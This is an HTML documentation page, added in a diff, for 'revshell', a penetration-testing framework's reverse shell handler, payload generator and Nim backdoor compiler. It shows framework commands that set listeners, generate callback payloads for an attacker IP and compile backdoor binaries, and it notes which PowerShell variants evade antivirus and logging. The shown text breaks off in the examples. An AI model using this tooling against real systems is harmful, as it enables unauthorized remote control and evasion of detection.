@@ -1,0 +1,1086 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>revshell - SecV Documentation</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=JetBrains+Mono:ital,wght@0,300;0,400;0,500;1,300&display=swap" rel="stylesheet">
+<style>
+*, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; -webkit-font-smoothing: antialiased; }
+
+:root {
+  --bg:      #050505;
+  --bg1:     #0d0d0d;
+  --bg2:     #141414;
+  --bg3:     #1c1c1c;
+  --border:  rgba(255,255,255,0.06);
+  --border2: rgba(255,255,255,0.13);
+  --border3: rgba(255,255,255,0.2);
+  --text:    #a8a8a8;
+  --muted:   #505050;
+  --dim:     #252525;
+  --white:   #f0f0f0;
+  --off:     #d8d8d8;
+  --grey:    #787878;
+  --acc:     #88aacc;
+  --mono:    'JetBrains Mono', monospace;
+  --disp:    'Syne', sans-serif;
+  --nav-h:   52px;
+  --transition: 0.16s ease;
+}
+
+body { font-family: var(--mono); background: var(--bg); color: var(--text); line-height: 1.7; overflow-x: hidden; }
+::-webkit-scrollbar { width: 4px; height: 4px; }
+::-webkit-scrollbar-track { background: var(--bg); }
+::-webkit-scrollbar-thumb { background: var(--bg3); border-radius: 2px; }
+
+nav {
+  position: fixed; top: 0; left: 0; right: 0; z-index: 100;
+  height: var(--nav-h); display: flex; align-items: center;
+  justify-content: space-between; padding: 0 2.5rem;
+  border-bottom: 1px solid transparent; transition: border-color 0.3s, background 0.3s;
+}
+nav.scrolled { background: rgba(5,5,5,0.96); backdrop-filter: blur(16px); border-color: var(--border); }
+.logo { font-family: var(--disp); font-size: 0.9rem; font-weight: 700; color: var(--off); text-decoration: none; letter-spacing: 0.01em; display: flex; align-items: center; gap: 0.55rem; }
+.logo-mark { width: 6px; height: 6px; background: var(--white); flex-shrink: 0; }
+.nav-links { display: flex; align-items: center; gap: 0.1rem; }
+.nav-link { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; padding: 0.4rem 0.75rem; transition: color var(--transition); }
+.nav-link:hover { color: var(--text); }
+.nav-link.active { color: var(--white); }
+.nav-btn { font-family: var(--mono); font-size: 0.62rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--text); text-decoration: none; padding: 0.4rem 0.9rem; border: 1px solid var(--border2); margin-left: 0.5rem; transition: border-color var(--transition), color var(--transition); }
+.nav-btn:hover { border-color: var(--white); color: var(--white); }
+.nav-btn.primary { background: var(--white); border-color: var(--white); color: var(--bg); }
+.nav-btn.primary:hover { background: transparent; color: var(--white); }
+.nav-burger { display: none; background: none; border: 1px solid var(--border2); padding: 0.4rem 0.6rem; cursor: pointer; border-radius: 3px; flex-direction: column; gap: 4px; }
+.nav-burger span { display: block; width: 18px; height: 1px; background: var(--text); transition: transform var(--transition), opacity var(--transition); }
+body.nav-open .nav-burger span:nth-child(1) { transform: rotate(45deg) translate(3.5px,3.5px); }
+body.nav-open .nav-burger span:nth-child(2) { opacity: 0; }
+body.nav-open .nav-burger span:nth-child(3) { transform: rotate(-45deg) translate(3.5px,-3.5px); }
+
+.page { max-width: 1080px; margin: 0 auto; padding: 0 2.5rem; }
+.doc-header { padding-top: calc(var(--nav-h) + 3.5rem); padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); animation: rise 0.45s ease both; }
+@keyframes rise { from { opacity:0; transform:translateY(10px); } to { opacity:1; transform:none; } }
+
+.breadcrumb { font-size: 0.56rem; letter-spacing: 0.18em; text-transform: uppercase; color: var(--muted); margin-bottom: 1.75rem; display: flex; align-items: center; gap: 0.6rem; flex-wrap: wrap; }
+.breadcrumb a { color: var(--muted); text-decoration: none; transition: color var(--transition); }
+.breadcrumb a:hover { color: var(--text); }
+.breadcrumb span { color: var(--dim); }
+
+.module-meta { display: flex; align-items: flex-start; justify-content: space-between; gap: 2.5rem; flex-wrap: wrap; }
+.module-title { font-family: var(--disp); font-size: clamp(2.8rem, 6vw, 4.8rem); font-weight: 800; letter-spacing: -0.04em; color: var(--white); line-height: 0.95; margin-bottom: 0.85rem; }
+.module-title span { color: var(--grey); font-weight: 400; }
+.module-sub { font-size: 0.84rem; color: var(--muted); line-height: 1.85; max-width: 500px; margin-bottom: 1.5rem; }
+.module-tags { display: flex; gap: 0.4rem; flex-wrap: wrap; }
+.tag { font-size: 0.5rem; letter-spacing: 0.14em; text-transform: uppercase; padding: 0.18rem 0.55rem; border: 1px solid var(--border2); color: var(--muted); }
+.tag.hi { color: var(--white); border-color: rgba(255,255,255,0.28); }
+.module-stats { display: flex; flex-direction: column; gap: 1rem; min-width: 210px; }
+.stat-row { display: flex; justify-content: space-between; align-items: center; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.68rem; gap: 2rem; }
+.stat-row:last-child { border-bottom: none; }
+.stat-lbl { letter-spacing: 0.12em; text-transform: uppercase; color: var(--muted); }
+.stat-v { color: var(--white); font-weight: 500; }
+
+.doc-body { display: grid; grid-template-columns: 200px 1fr; gap: 4rem; padding: 3.5rem 0; align-items: start; }
+.sidebar { position: sticky; top: calc(var(--nav-h) + 1rem); }
+.sidebar-nav { list-style: none; }
+.sidebar-nav li { margin-bottom: 0.05rem; }
+.sidebar-nav a { display: block; font-size: 0.62rem; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); text-decoration: none; padding: 0.4rem 0; border-left: 2px solid transparent; padding-left: 0.75rem; transition: color var(--transition), border-color var(--transition); }
+.sidebar-nav a:hover { color: var(--text); border-color: var(--border2); }
+.sidebar-nav a.active { color: var(--white); border-color: var(--white); }
+.sidebar-sep { font-size: 0.48rem; letter-spacing: 0.2em; text-transform: uppercase; color: var(--dim); padding: 0.7rem 0 0.25rem 0.75rem; margin-top: 0.5rem; }
+
+.content section { padding-bottom: 3.5rem; border-bottom: 1px solid var(--border); margin-bottom: 3.5rem; }
+.content section:last-child { border-bottom: none; }
+.sec-label { font-size: 0.52rem; letter-spacing: 0.22em; text-transform: uppercase; color: var(--grey); margin-bottom: 0.55rem; }
+
+h2 { font-family: var(--disp); font-size: clamp(1.4rem, 2.5vw, 2rem); font-weight: 800; letter-spacing: -0.03em; color: var(--white); margin-bottom: 1.25rem; line-height: 1.05; }
+h3 { font-family: var(--disp); font-size: 1.05rem; font-weight: 700; color: var(--off); margin: 2rem 0 0.8rem; letter-spacing: -0.01em; }
+p { font-size: 0.82rem; color: var(--text); line-height: 1.85; margin-bottom: 0.9rem; }
+p:last-child { margin-bottom: 0; }
+a { color: var(--grey); }
+a:hover { color: var(--white); }
+
+pre { background: var(--bg1); border: 1px solid var(--border); border-left: 3px solid var(--border3); padding: 1.1rem 1.35rem; overflow-x: auto; margin: 1rem 0; font-size: 0.76rem; line-height: 1.75; border-radius: 0 2px 2px 0; }
+code { font-family: var(--mono); font-size: 0.76rem; background: var(--bg1); border: 1px solid var(--border); padding: 0.08rem 0.35rem; color: var(--off); }
+pre code { background: none; border: none; padding: 0; font-size: inherit; }
+.comment { color: var(--muted); font-style: italic; }
+.kw { color: var(--white); }
+.str { color: var(--grey); }
+
+.table-wrap { overflow-x: auto; margin: 1rem 0; -webkit-overflow-scrolling: touch; }
+table { width: 100%; border-collapse: collapse; font-size: 0.74rem; min-width: 420px; }
+th { font-family: var(--mono); font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--grey); text-align: left; padding: 0.6rem 1rem; border-bottom: 1px solid var(--border2); background: var(--bg1); white-space: nowrap; }
+td { padding: 0.7rem 1rem; border-bottom: 1px solid var(--border); color: var(--text); vertical-align: top; line-height: 1.65; }
+tr:last-child td { border-bottom: none; }
+tr:hover td { background: var(--bg1); }
+td:first-child { color: var(--off); font-weight: 500; white-space: nowrap; }
+td code { font-size: 0.7rem; }
+
+.feat-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1px; background: var(--border); border: 1px solid var(--border); margin: 1.25rem 0; }
+.feat-cell { background: var(--bg); padding: 1.1rem; transition: background var(--transition); }
+.feat-cell:hover { background: var(--bg1); }
+.feat-icon { font-size: 0.54rem; letter-spacing: 0.14em; text-transform: uppercase; color: var(--grey); margin-bottom: 0.4rem; }
+.feat-name { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--white); margin-bottom: 0.3rem; }
+.feat-desc { font-size: 0.72rem; color: var(--muted); line-height: 1.6; }
+
+.mode-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 1px; background: var(--border); border: 1px solid var(--border); margin: 1.25rem 0; }
+.mode-card { background: var(--bg); padding: 1.25rem; transition: background var(--transition); }
+.mode-card:hover { background: var(--bg1); }
+.mode-key { font-family: var(--disp); font-size: 1rem; font-weight: 700; color: var(--white); margin-bottom: 0.4rem; display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; flex-wrap: wrap; }
+.mode-badge { font-size: 0.46rem; letter-spacing: 0.12em; text-transform: uppercase; padding: 0.12rem 0.38rem; border: 1px solid var(--border2); color: var(--muted); }
+.mode-badge.dflt { color: var(--white); border-color: rgba(255,255,255,0.28); }
+.mode-desc { font-size: 0.71rem; color: var(--muted); line-height: 1.6; }
+
+.payload-grid { display: flex; flex-wrap: wrap; gap: 0.4rem; margin: 1rem 0; }
+.payload-tag { font-size: 0.62rem; font-family: var(--mono); padding: 0.25rem 0.6rem; background: var(--bg1); border: 1px solid var(--border2); color: var(--off); }
+
+.callout { display: flex; gap: 0.75rem; padding: 0.95rem 1.15rem; border: 1px solid var(--border2); border-left: 3px solid var(--border2); margin: 1.25rem 0; font-size: 0.78rem; line-height: 1.7; color: var(--text); border-radius: 0 2px 2px 0; }
+.callout.warn { border-left-color: var(--grey); }
+.callout.crit { border-left-color: var(--white); background: rgba(255,255,255,0.02); }
+.callout-mark { font-size: 0.64rem; color: var(--grey); flex-shrink: 0; margin-top: 0.15rem; }
+
+footer { border-top: 1px solid var(--border); margin-top: 2rem; }
+.foot-inner { max-width: 1080px; margin: 0 auto; padding: 1.5rem 2.5rem; display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 1rem; }
+.foot-brand { font-family: var(--disp); font-size: 0.88rem; font-weight: 700; color: var(--muted); text-decoration: none; }
+.foot-links { display: flex; gap: 1.75rem; }
+.foot-link { font-size: 0.55rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); text-decoration: none; transition: color var(--transition); }
+.foot-link:hover { color: var(--text); }
+.foot-note { font-size: 0.52rem; color: var(--dim); letter-spacing: 0.06em; }
+
+@media (max-width: 860px) {
+  nav { padding: 0 1.5rem; }
+  .nav-links { display: none; }
+  .nav-burger { display: flex; }
+  body.nav-open .nav-links { display: flex; position: fixed; top: var(--nav-h); left: 0; right: 0; background: var(--bg); border-bottom: 1px solid var(--border); flex-direction: column; padding: 1rem 1.5rem 1.5rem; gap: 0.25rem; align-items: flex-start; z-index: 99; }
+  .page { padding: 0 1.5rem; }
+  .doc-body { grid-template-columns: 1fr; gap: 0; }
+  .sidebar { display: none; }
+  .module-title { font-size: 2.6rem; }
+  .module-stats { min-width: unset; width: 100%; }
+  pre { font-size: 0.7rem; }
+}
+@media (max-width: 540px) {
+  .feat-grid { grid-template-columns: 1fr; }
+  .mode-grid { grid-template-columns: 1fr; }
+  .page { padding: 0 1rem; }
+  pre { padding: 0.85rem 1rem; }
+  .doc-header { padding-top: calc(var(--nav-h) + 2rem); }
+}
+</style>
+</head>
+<body>
+
+<nav id="nav">
+  <a class="logo" href="../index.html">
+    <span class="logo-mark"></span>
+    SecVulnHub
+  </a>
+  <div class="nav-links">
+    <a class="nav-link" href="../index.html">Docs</a>
+    <a class="nav-link" href="netrecon.html">netrecon</a>
+    <a class="nav-link" href="android_pentest.html">android</a>
+    <a class="nav-link" href="wifi_monitor.html">wifi_monitor</a>
+    <a class="nav-link active" href="revshell.html">revshell</a>
+    <a class="nav-btn" href="https://github.com/0xb0rn3" target="_blank">GitHub</a>
+    <a class="nav-btn primary" href="https://discord.gg/SecVulnHub" target="_blank">Discord</a>
+  </div>
+  <button class="nav-burger" id="burger" aria-label="Toggle menu">
+    <span></span><span></span><span></span>
+  </button>
+</nav>
+
+<div class="page">
+
+  <div class="doc-header">
+    <div class="breadcrumb">
+      <a href="../index.html">SecVulnHub</a>
+      <span>/</span>
+      <a href="../index.html#modules">Modules</a>
+      <span>/</span>
+      revshell
+    </div>
+    <div class="module-meta">
+      <div>
+        <h1 class="module-title">revshell<span>.</span></h1>
+        <p class="module-sub">Multi-session reverse shell handler and payload generator. 30+ language one-liners, interactive session TUI, Nim backdoor compiler, and shared shell infrastructure for every other secV module that needs a callback listener.</p>
+        <div class="module-tags">
+          <span class="tag hi">secV Module</span>
+          <span class="tag">Reverse Shell</span>
+          <span class="tag">Multi-Session</span>
+          <span class="tag">Payload Generator</span>
+          <span class="tag">Nim Backdoor</span>
+          <span class="tag">Python 3</span>
+          <span class="tag">v1.0.1</span>
+        </div>
+      </div>
+      <div class="module-stats">
+        <div class="stat-row"><span class="stat-lbl">Category</span><span class="stat-v">Network</span></div>
+        <div class="stat-row"><span class="stat-lbl">Language</span><span class="stat-v">Python 3</span></div>
+        <div class="stat-row"><span class="stat-lbl">Location</span><span class="stat-v">tools/network/revshell/</span></div>
+        <div class="stat-row"><span class="stat-lbl">Author</span><span class="stat-v">0xb0rn3</span></div>
+        <div class="stat-row"><span class="stat-lbl">Version</span><span class="stat-v">v1.0.1</span></div>
+        <div class="stat-row"><span class="stat-lbl">License</span><span class="stat-v">MIT</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="doc-body">
+
+    <aside class="sidebar">
+      <ul class="sidebar-nav">
+        <li><div class="sidebar-sep">Overview</div></li>
+        <li><a href="#overview" class="active">What it does</a></li>
+        <li><a href="#quickstart">Quick Start</a></li>
+        <li><div class="sidebar-sep">Reference</div></li>
+        <li><a href="#modes">Modes</a></li>
+        <li><a href="#tui">Handler TUI</a></li>
+        <li><a href="#payloads">Payload Types</a></li>
+        <li><a href="#params">Parameters</a></li>
+        <li><div class="sidebar-sep">More</div></li>
+        <li><a href="#examples">Examples</a></li>
+        <li><div class="sidebar-sep">Internals</div></li>
+        <li><a href="#arch">Architecture</a></li>
+        <li><a href="#tcp-protocol">TCP Wire</a></li>
+        <li><a href="#meterpreter-staging">MSF Staging</a></li>
+        <li><a href="#nim-backdoor-internals">Nim Backdoor</a></li>
+        <li><a href="#handler-internals">Handler</a></li>
+        <li><a href="#revshell-customization">Customization</a></li>
+        <li><div class="sidebar-sep">Study</div></li>
+        <li><a href="#learning-path">Learning Path</a></li>
+        <li><a href="#deps">Dependencies</a></li>
+      </ul>
+    </aside>
+
+    <div class="content">
+
+      <!-- Beginner Startup -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to reverse shells? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li>▸ Your LHOST IP (run <code>ip a</code> or <code>hostname -I</code>)</li>
+              <li>▸ A port to listen on (4444 is conventional)</li>
+              <li>▸ Network access between attacker and target</li>
+              <li>▸ Target must be authorized for testing</li>
+            </ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">secV (revshell) ❯ set mode serve
+secV (revshell) ❯ set ports 4444
+secV (revshell) ❯ run target</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Modes by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> serve (start listener)</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> generate (build payloads)</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> nim_backdoor (compile binary)</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong>
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Reverse Shell</a> — the target connects back to you (vs bind shell where you connect to the target) &nbsp;·&nbsp;
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">LHOST</a> — your attacker IP the shell calls back to &nbsp;·&nbsp;
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">LPORT</a> — local port your handler listens on &nbsp;·&nbsp;
+          <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Meterpreter</a> — Metasploit's advanced shell with file ops, pivot, and more
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
+
+      <!-- Overview -->
+      <section id="overview">
+        <p class="sec-label">Overview</p>
+        <h2>What revshell does</h2>
+        <p><code>revshell</code> is secV's shared shell infrastructure — a multi-session reverse shell handler and payload generator ported from <a href="https://github.com/malwarekid/OnlyShell" target="_blank">OnlyShell</a>, extended with 30+ language one-liners and a Nim backdoor compiler. Every other secV module that needs a shell listener (android_pentest, wifi_monitor, adsec, websec, ctfpwn) imports revshell internally — it is the framework's callback engine.</p>
+        <p>Three operating modes: <code>serve</code> starts an interactive multi-session handler, <code>generate</code> prints ready-to-paste payload one-liners for any language or platform, and <code>nim_backdoor</code> compiles a standalone reverse-shell binary from a Nim source template.</p>
+
+        <div class="feat-grid">
+          <div class="feat-cell">
+            <div class="feat-icon">Handler</div>
+            <div class="feat-name">Multi-Session</div>
+            <div class="feat-desc">Accept concurrent shells from multiple targets. Switch between sessions without dropping any. Broadcast commands to all sessions simultaneously.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Payloads</div>
+            <div class="feat-name">30+ One-Liners</div>
+            <div class="feat-desc">Bash, Python, Perl, Ruby, PHP, Node.js, Go, Java, Lua, Awk, Socat, Ncat, PowerShell (plain + b64 + IEX), Metasploit ELF/EXE/APK, and more.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Compiler</div>
+            <div class="feat-name">Nim Backdoor</div>
+            <div class="feat-desc">Compiles a cross-platform binary (Linux/Windows/macOS) from a Nim template. No Python or Bash dependency on the target — the binary is self-contained.</div>
+          </div>
+          <div class="feat-cell">
+            <div class="feat-icon">Shared</div>
+            <div class="feat-name">Framework Core</div>
+            <div class="feat-desc">Used internally by android_pentest, wifi_monitor, websec, adsec, and ctfpwn as their shell callback engine. Run it standalone or let other modules call it automatically.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Quick Start -->
+      <section id="quickstart">
+        <p class="sec-label">Getting Started</p>
+        <h2>Quick start</h2>
+
+        <h3>Start an interactive handler</h3>
+        <pre><code>secV ❯ <span class="kw">use</span> revshell
+secV (revshell) ❯ <span class="kw">set</span> mode serve
+secV (revshell) ❯ <span class="kw">set</span> ports 4444
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Generate all payloads for a host</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> mode generate
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.10.10
+secV (revshell) ❯ <span class="kw">set</span> shell all
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Generate a specific payload type</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> mode generate
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.10.10
+secV (revshell) ❯ <span class="kw">set</span> lport 4444
+secV (revshell) ❯ <span class="kw">set</span> shell python3
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>Compile a Nim binary backdoor</h3>
+        <pre><code>secV (revshell) ❯ <span class="kw">set</span> mode nim_backdoor
+secV (revshell) ❯ <span class="kw">set</span> lhost 10.10.10.10
+secV (revshell) ❯ <span class="kw">set</span> lport 4444
+secV (revshell) ❯ <span class="kw">set</span> target_os linux
+secV (revshell) ❯ <span class="kw">run</span> target</code></pre>
+
+        <h3>CLI shortcut — skip secV shell, start on port 4444 immediately</h3>
+        <pre><code>python3 tools/network/revshell/revshell.py 4444</code></pre>
+      </section>
+
+      <!-- Modes -->
+      <section id="modes">
+        <p class="sec-label">Reference</p>
+        <h2>Modes</h2>
+        <p>Set via <code>set mode &lt;name&gt;</code>.</p>
+
+        <div class="mode-grid">
+          <div class="mode-card">
+            <div class="mode-key">serve <span class="mode-badge dflt">default</span></div>
+            <div class="mode-desc">Start an interactive multi-session handler on the configured ports. Accepts incoming reverse shells from any language payload. Use the TUI commands below to manage sessions.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">generate</div>
+            <div class="mode-desc">Print one or all reverse shell payload one-liners ready for use. Set <code>shell</code> to a specific type (e.g. <code>python3</code>) or <code>all</code> to get every supported payload. Set <code>lhost</code> and <code>lport</code> to embed your listener address.</div>
+          </div>
+          <div class="mode-card">
+            <div class="mode-key">nim_backdoor</div>
+            <div class="mode-desc">Compile a self-contained binary reverse shell from a Nim source template. Requires <code>nim</code> compiler installed. Set <code>target_os</code> to <code>linux</code>, <code>windows</code>, or <code>macos</code>. Output binary at <code>~/.secv/revshell/&lt;stem&gt;</code>.</div>
+          </div>
+        </div>
+      </section>
+
+      <!-- Handler TUI -->
+      <section id="tui">
+        <p class="sec-label">Interactive</p>
+        <h2>Handler TUI commands</h2>
+        <p>Once <code>serve</code> is running and a session connects, the handler drops into an interactive TUI prompt. The following commands are available:</p>
+
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Command</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>sessions</code></td>
+              <td>List all active sessions with their ID, remote IP, and time connected.</td>
+            </tr>
+            <tr>
+              <td><code>interact &lt;id&gt;</code></td>
+              <td>Attach to a session and enter its interactive shell. Commands you type are sent directly to the remote shell. Press <code>Ctrl+C</code> or type <code>bg</code> to detach.</td>
+            </tr>
+            <tr>
+              <td><code>bg</code></td>
+              <td>Background the current active session and return to the handler prompt. The session remains live and can be re-attached with <code>interact &lt;id&gt;</code>.</td>
+            </tr>
+            <tr>
+              <td><code>exec-all &lt;cmd&gt;</code></td>
+              <td>Broadcast a command to all active sessions simultaneously. Output from each session is printed inline with the session ID as prefix.</td>
+            </tr>
+            <tr>
+              <td><code>kill &lt;id&gt;</code></td>
+              <td>Terminate and remove the specified session. Sends a close signal to the remote end. The session slot is freed immediately.</td>
+            </tr>
+          </tbody>
+        </table>
+        </div>
+
+        <div class="callout warn">
+          <span class="callout-mark">!</span>
+          <span>Sessions are kept in memory only. If the secV process exits, all session state is lost — the remote shell process continues running but loses its callback connection. Use the handler as a long-running daemon or note session IDs before detaching.</span>
+        </div>
+      </section>
+
+      <!-- Payload Types -->
+      <section id="payloads">
+        <p class="sec-label">Reference</p>
+        <h2>Payload types</h2>
+        <p>Pass any of these to <code>set shell &lt;type&gt;</code>, or <code>set shell all</code> to generate every one for your LHOST/LPORT.</p>
+
+        <div class="payload-grid">
+          <span class="payload-tag">bash_tcp</span>
+          <span class="payload-tag">bash_udp</span>
+          <span class="payload-tag">bash_mkfifo</span>
+          <span class="payload-tag">python3</span>
+          <span class="payload-tag">python2</span>
+          <span class="payload-tag">perl</span>
+          <span class="payload-tag">ruby</span>
+          <span class="payload-tag">php_proc_open</span>
+          <span class="payload-tag">php_passthru</span>
+          <span class="payload-tag">nc</span>
+          <span class="payload-tag">nc_mkfifo</span>
+          <span class="payload-tag">ncat</span>
+          <span class="payload-tag">socat</span>
+          <span class="payload-tag">socat_pty</span>
+          <span class="payload-tag">nodejs</span>
+          <span class="payload-tag">golang</span>
+          <span class="payload-tag">awk</span>
+          <span class="payload-tag">lua</span>
+          <span class="payload-tag">java</span>
+          <span class="payload-tag">powershell</span>
+          <span class="payload-tag">powershell_b64</span>
+          <span class="payload-tag">powershell_iex</span>
+          <span class="payload-tag">msf_elf</span>
+          <span class="payload-tag">msf_exe</span>
+          <span class="payload-tag">msf_apk</span>
+        </div>
+
+        <h3>Payload notes</h3>
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Payload</th><th>Target OS</th><th>Notes</th></tr></thead>
+          <tbody>
+            <tr><td><code>bash_tcp</code></td><td>Linux/macOS</td><td>Most reliable on Linux. Requires /bin/bash (not sh). Fast one-liner.</td></tr>
+            <tr><td><code>bash_mkfifo</code></td><td>Linux/macOS</td><td>Named pipe — more portable than /dev/tcp. Works on restricted shells.</td></tr>
+            <tr><td><code>python3</code></td><td>Any</td><td>Works wherever Python 3 is installed. Gives a PTY if pty module is available.</td></tr>
+            <tr><td><code>powershell</code></td><td>Windows</td><td>Plaintext. May be caught by basic AV. Use <code>powershell_b64</code> or <code>_iex</code> for evasion.</td></tr>
+            <tr><td><code>powershell_b64</code></td><td>Windows</td><td>Base64-encoded command — bypasses basic command logging and simple signature AV.</td></tr>
+            <tr><td><code>powershell_iex</code></td><td>Windows</td><td>Downloads and executes from a URL (Invoke-Expression). Fully fileless.</td></tr>
+            <tr><td><code>socat_pty</code></td><td>Linux/macOS</td><td>Full PTY — arrow keys, tab completion, Ctrl+C work correctly. Best interactive experience.</td></tr>
+            <tr><td><code>msf_elf</code></td><td>Linux</td><td>Meterpreter payload ELF via msfvenom. Full Metasploit session (file ops, pivot, etc.).</td></tr>
+            <tr><td><code>msf_apk</code></td><td>Android</td><td>Meterpreter APK. Use android_pentest module for the full delivery pipeline.</td></tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- Parameters -->
+      <section id="params">
+        <p class="sec-label">Reference</p>
+        <h2>Parameters</h2>
+
+        <div class="table-wrap">
+        <table>
+          <thead><tr><th>Parameter</th><th>Type</th><th>Default</th><th>Description</th></tr></thead>
+          <tbody>
+            <tr>
+              <td><code>mode</code></td>
+              <td>string</td>
+              <td>serve</td>
+              <td>Operating mode: <code>serve</code> (handler), <code>generate</code> (payload generator), <code>nim_backdoor</code> (compile binary).</td>
+            </tr>
+            <tr>
+              <td><code>ports</code></td>
+              <td>string</td>
+              <td>4444</td>
+              <td>Comma-separated list of listener ports for <code>serve</code> mode, e.g. <code>4444,4445,9001</code>. One thread per port.</td>
+            </tr>
+            <tr>
+              <td><code>lhost</code></td>
+              <td>string</td>
+              <td>auto</td>
+              <td>Attacker IP embedded into generated payloads. Auto-detected via routing table if not set.</td>
+            </tr>
+            <tr>
+              <td><code>lport</code></td>
+              <td>integer</td>
+              <td>4444</td>
+              <td>Listener port embedded into generated payloads.</td>
+            </tr>
+            <tr>
+              <td><code>shell</code></td>
+              <td>string</td>
+              <td>all</td>
+              <td>Payload type for <code>generate</code> mode. Set to a specific type name or <code>all</code> for every payload.</td>
+            </tr>
+            <tr>
+              <td><code>target_os</code></td>
+              <td>string</td>
+              <td>linux</td>
+              <td>Target OS for <code>nim_backdoor</code> compilation: <code>linux</code>, <code>windows</code>, or <code>macos</code>.</td>
+            </tr>
+          </tbody>
+        </table>
+        </div>
+      </section>
+
+      <!-- Examples -->
+      <section id="examples">
+        <p class="sec-label">Usage</p>
+        <h2>Examples</h2>
+
+        <h3>Multi-port handler — catch shells on multiple ports</h3>
+        <pre><code>secV ❯ <span class="kw">use</span> revshell
+secV (revshell) ❯ <span class="kw">set</span> mode serve
+secV (revshell) ❯ <span class="kw">set</span> ports 4444,9001,4445
+secV (revshell) ❯ <span class="kw">run</span> target
+
+<span class="comment"># Once a session connects:</span>
+[revshell] session 1 connected from 10.10.10.50:52341
+❯ sessions
+  [1] 10.10.10.50  connected 00:02:14
+❯ interact 1
+$ whoami
+www-data
+$ bg
+❯ exec-all id
